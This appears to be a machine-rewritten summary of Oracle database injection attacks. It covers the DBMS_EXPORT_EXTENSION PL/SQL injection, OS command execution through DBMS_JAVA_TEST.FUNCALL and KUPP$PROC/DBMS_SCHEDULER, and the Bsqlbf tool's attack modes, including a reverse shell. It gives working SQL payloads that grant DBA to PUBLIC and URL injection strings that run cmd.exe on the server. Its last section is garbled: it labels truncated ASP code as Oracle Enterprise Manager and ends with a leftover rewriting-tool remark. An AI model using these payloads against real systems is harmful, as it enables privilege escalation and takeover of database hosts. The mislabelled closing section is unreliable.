### DBMS_EXPORT_EXTENSION and GET_DOMAIN_INDEX_TABLES Vulnerability

**Overview:**
- **Function:** `GET_DOMAIN_INDEX_TABLES()`
- **Vulnerability Type:** PL/SQL Injection
- **Privileges:** Runs with definer (SYS) privileges
- **Impact:** 
  - Allows privilege escalation
  - Enables OS code execution from web applications
  - Publicly executable function
- **Fixed in:** CPU April 2006
- **Vulnerable Versions:**
  - Oracle 8.1.7.4
  - Oracle 9.2.0.1 - 9.2.0.7
  - Oracle 10.1.0.2 - 10.1.0.4
  - Oracle 10.2.0.1 - 10.2.0.2
  - Oracle XE

**Example Exploit:**

```sql
SELECT SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(
    'FOO', 'BAR', 'DBMS_OUTPUT.PUT(:P1); EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION; BEGIN EXECUTE IMMEDIATE ''''grant dba to public''''; END;''; END;--',
    'SYS', 0, '1', 0
) FROM DUAL;
```

### Privilege Escalation and OS Code Execution

**Details:**
- **Unprivileged Access:**
  - Up to Oracle 10.2.0.2
  - Fixed in CPU July 2006 and earlier
- **Privileged Access:**
  - DBA privileges (not necessarily SYS DBA)
  - OS code execution feature
  - Java IO privileges (Oracle 10g R2, 11g R1, 11g R2)

**Exploitation Tools:**
- **Commercial:**
  - Pangolin
  - Coreimpact
- **Free:**
  - Bsqlbf
  - Supports OS code execution by:
    - Java (universal)
    - PL/SQL native make utility (9i only)
    - DBMS_SCHEDULER (universal)

### Functions for OS Code Execution

**Functions:**
- **DBMS_JAVA.RUNJAVA()**
  - Available in Oracle 11g R1 and R2
- **DBMS_JAVA_TEST.FUNCALL()**
  - Available in Oracle 10g R2, 11g R1, and R2
  - Java class allowing OS code execution by default: `oracle/aurora/util/Wrapper`

**Example Exploit:**

```sql
http://vuln.com?ora.php?id=1 AND (SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper', 'main', 'c:\\windows\\system32\\cmd.exe', '/c', 'dir > c:\owned.txt') FROM DUAL) IS NULL --
```

**Notes:**
- A DBA can already grant himself Java IO privileges.
- The privileges are not available in the same session.
- The Java class allowing OS code execution could be removed or changed in a future CPU.

### Arbitrary PL/SQL Execution

**Function:**
- **SYS.KUPP$PROC.CREATE_MASTER_PROCESS()**
  - Executes arbitrary PL/SQL statements
  - Can call DBMS_SCHEDULER to run OS code

**Example Exploit:**

```sql
http://vuln.com?ora.php?id=1 AND (SELECT SYS.KUPP$PROC.CREATE_MASTER_PROCESS('DBMS_SCHEDULER.create_program(''BSQLBFPROG'', ''EXECUTABLE'', ''c:\WINDOWS\system32\cmd.exe /c dir>>c:\owned.txt'', 0, TRUE);DBMS_SCHEDULER.create_job(job_name => ''BSQLBFJOB'', program_name => ''BSQLBFPROG'', start_date => NULL, repeat_interval => NULL, end_date => NULL, enabled => TRUE, auto_drop => TRUE);dbms_lock.sleep(1);DBMS_SCHEDULER.drop_program(PROGRAM_NAME => ''BSQLBFPROG'');DBMS_SCHEDULER.PURGE_LOG;') FROM DUAL) IS NOT NULL --
```

### Modes of Attack

**Bsqlbf 2.6:**
- **Type 0:** Blind injection based on True and False responses (default)
- **Type 1:** Blind injection based on True and Error responses
- **Type 2:** Injection in ORDER BY and GROUP BY
- **Type 3:** Extracting data with SYS privileges [ORACLE dbms_export_extension exploit]
- **Type 4:** OS code execution [ORACLE dbms_export_extension exploit]
- **Type 5:** Reading files [ORACLE dbms_export_extension exploit, based on Java]
- **Type 6:** OS code execution [ORACLE DBMS_REPCAT_RPC.VALIDATE_REMOTE_RC exploit]
- **Type 7:** OS code execution [ORACLE SYS.KUPP$PROC.CREATE_MASTER_PROCESS(), DBA Privs]
  - Supports meterpreter payload execution (`-cmd=revshell`)
  - Cleanup after exiting Metasploit session (`-cmd=cleanup`)
- **Type 8:** OS code execution [ORACLE DBMS_JAVA_TEST.FUNCALL, with JAVA IO Permissions]
  - Supports meterpreter payload execution (`-cmd=revshell`)

### CSRF in Admin Section

**Vulnerability:**
- SQL Injection vulnerability
- Allows execution of SQL as a feature
- Non-interactive SQL injections
- Second-order SQL injection in the admin section

**Example in Oracle Enterprise Manager 11g:**

```vb
Dim conn, rec, query1, query2, login_id, old_pass, new_pass
login_id = Replace(Request.Form("login_id"), "'", "''")
old_pass = Replace(Request.Form("old_pass"), "'", "''")
new_pass = Replace(Request.Form("new_pass"), "'", "''")

Set conn = CreateObject("ADODB.Connection")
conn.Open = "DSN=AccountDB;UID=sa;PWD=password;"
query1 = "select * from tbl_user where login_id='" & login_id & "' and password='" & old_pass
```

This optimized text provides a clear and structured overview of the vulnerabilities, their impacts, and examples of how they can be exploited.